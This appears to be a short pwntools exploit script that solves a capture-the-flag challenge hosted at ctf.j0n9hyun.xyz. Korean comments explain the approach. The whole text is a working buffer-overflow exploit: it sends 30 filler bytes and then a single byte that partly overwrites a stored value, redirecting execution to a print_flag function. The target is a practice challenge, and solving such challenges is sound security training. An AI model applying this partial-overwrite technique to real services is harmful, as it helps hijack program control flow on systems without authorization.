from pwn import *

r = remote('ctf.j0n9hyun.xyz', 3007)

r.recvline()

payload = "A" * 30 # src는 31만큼 입력 값을 복사하므로 30까지 아무 값을 넣고
payload += "\xd8" # 마지막 v3의 1byte값을 print_flag의 offset으로 덮어씌우면 print_flag으로 돌아간다!

r.sendline(payload)

r.interactive()
